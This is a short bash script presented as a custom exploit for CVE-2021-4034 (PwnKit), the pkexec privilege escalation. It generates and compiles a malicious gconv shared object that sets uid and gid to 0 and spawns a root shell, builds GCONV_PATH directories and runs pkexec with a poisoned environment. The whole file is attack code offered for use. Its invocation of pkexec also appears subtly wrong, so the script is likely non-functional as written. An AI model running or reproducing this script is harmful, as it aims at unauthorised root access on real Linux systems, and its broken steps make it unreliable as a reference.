#!/bin/bash

echo "[+] CVE-2021-4034 (PwnKit) Custom Exploit"
echo "[+] Creating malicious C file..."

cat <<EOF > pwnkit.c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

void gconv() {}
void gconv_init() {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    system("/bin/sh");
}
EOF

echo "[+] Compiling payload..."
mkdir -p 'GCONV_PATH=.'
echo > 'GCONV_PATH=./gconv-modules'
mkdir -p exploit
mv pwnkit.c exploit/pwnkit.c

cat <<EOF > exploit/gconv-modules
module UTF-8// PWNKIT// pwnkit 2
EOF

(cd exploit && gcc pwnkit.c -o pwnkit.so -shared -fPIC)

echo "[+] Creating directory structure..."
mkdir -p exploit/GCONV_PATH=.
cd exploit

cat <<EOF > pwnkit
#!/bin/sh
export PATH=.
export GCONV_PATH=.
export CHARSET=PWNKIT
export SHELL=not-used
pkexec
EOF

chmod +x pwnkit

echo "[+] Running exploit..."
./pwnkit
